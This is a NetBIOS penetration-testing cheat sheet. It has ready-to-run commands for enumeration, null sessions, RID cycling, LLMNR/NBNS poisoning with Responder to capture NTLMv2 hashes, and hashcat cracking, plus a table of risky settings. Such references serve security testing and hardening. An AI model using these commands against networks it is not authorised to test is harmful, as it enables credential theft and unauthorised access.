#NetBIOS #NetworkBasicInputOutputSystem #SMB #LLMNR #namepoisoning

## What is NetBIOS?
Network Basic Input/Output System — legacy API for network communication. Used by Windows for name resolution and session services before DNS was universal. Still active in Windows networks. Underlies SMB over TCP 139 (older clients). Three services: Name Service, Datagram Service, Session Service.

- Port: **UDP/TCP 137** — NetBIOS Name Service (NBNS)
- Port: **UDP 138** — NetBIOS Datagram Service
- Port: **TCP 139** — NetBIOS Session Service (SMB over NetBIOS)

---

## NetBIOS Name Types

| Suffix | Name Type | Description |
|---|---|---|
| `<00>` | Workstation | Host registered name |
| `<20>` | File Server | Server service |
| `<03>` | Messenger | Messenger service |
| `<1B>` | Domain Master Browser | PDC |
| `<1C>` | Domain Controllers | DC group |
| `<1D>` | Master Browser | Subnet master browser |

---

## Enumeration

```bash
# Nmap
nmap -p 137,138,139 -sU -sV --script nbstat,smb-os-discovery <target>
nmap -sU -p 137 --script nbstat <target>

# nbtscan — bulk NetBIOS enumeration
nbtscan <target>
nbtscan <subnet>/24
nbtscan -r <subnet>/24   # use port 137 (root required)

# nmblookup (Samba)
nmblookup -A <target>
nmblookup -S <netbios_name>   # lookup name

# rpcclient over NetBIOS (port 139)
rpcclient -U "" -N <target>    # null session over 139
rpcclient -U "<user>%<pass>" <target>
```

---

## Connect / Access

```bash
# smbclient over NetBIOS (port 139)
smbclient -L //<target> -p 139 -N
smbclient //<target>/<share> -p 139 -U <user>%<pass>

# rpcclient — null session (port 139)
rpcclient -U "" -N <target>
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo
rpcclient $> netshareenumall

# Metasploit
use auxiliary/scanner/netbios/nbname
```

---

## Attack Vectors

### LLMNR/NBNS Poisoning (Responder)

```bash
# LLMNR (Link-Local Multicast Name Resolution) — UDP 5355
# NBNS — broadcast fallback when DNS fails
# Poisoning: respond to all name queries with attacker IP

# Capture hashes with Responder
sudo responder -I tun0
sudo responder -I eth0 -wrf    # with WPAD, rogue DHCP, fingerprint

# Responder captures NTLMv2 hashes from:
# - Failed DNS → LLMNR/NBNS fallback
# - UNC path access attempts
# - WPAD auto-discovery

# Crack captured hashes
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

### NBNS Spoofing (Targeted)

```bash
# Spoof specific NetBIOS name with python
# inveigh (PowerShell) or responder
sudo python3 /usr/share/responder/tools/RunFinger.py -i <target>

# Force target to resolve a name you poison:
# 1. Wait for a file share access attempt (typo, script, etc.)
# 2. Responder answers "I am \\TYPO-SERVER"
# 3. NTLM auth hash sent to attacker
```

### Null Session Enumeration (Legacy)

```bash
# Windows XP/2000 era — may still exist on old systems
# Null session = anonymous IPC$ access
net use \\<target>\IPC$ "" /u:""

# Via rpcclient
rpcclient -U "" -N <target>
rpcclient $> enumdomusers         # list users
rpcclient $> enumdomgroups        # list groups
rpcclient $> querydominfo         # domain info
rpcclient $> netshareenumall      # list shares
rpcclient $> queryuser <RID>      # user details

# enum4linux (wraps rpcclient/smbclient)
enum4linux -a <target>
enum4linux -a -C <target>
```

### RID Cycling

```bash
# Enumerate users by RID brute force over null session
for i in $(seq 500 1100); do
  rpcclient -U "" -N <target> -c "queryuser 0x$(printf '%x' $i)" 2>/dev/null | grep "User Name"
done

# impacket-lookupsid
impacket-lookupsid <domain>/<user>:<pass>@<target>
impacket-lookupsid ''@<target>   # null session
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| LLMNR/NBNS enabled | Hash capture via poisoning |
| Null sessions allowed | Unauthenticated enumeration |
| NetBIOS enabled on internet-facing hosts | Name resolution attacks |
| SMBv1 enabled | EternalBlue + NetBIOS session attacks |
| Weak credentials + NBNS accessible | Easy lateral movement |

---

## Quick Reference

| Goal | Command |
|---|---|
| Scan subnet | `nbtscan <subnet>/24` |
| Lookup host | `nmblookup -A host` |
| Null session | `rpcclient -U "" -N host` |
| Enum users (null) | `rpcclient $> enumdomusers` |
| RID brute (impacket) | `impacket-lookupsid ''@host` |
| Hash poisoning | `sudo responder -I tun0` |
| Nmap | `nmap -sU -p 137 --script nbstat host` |
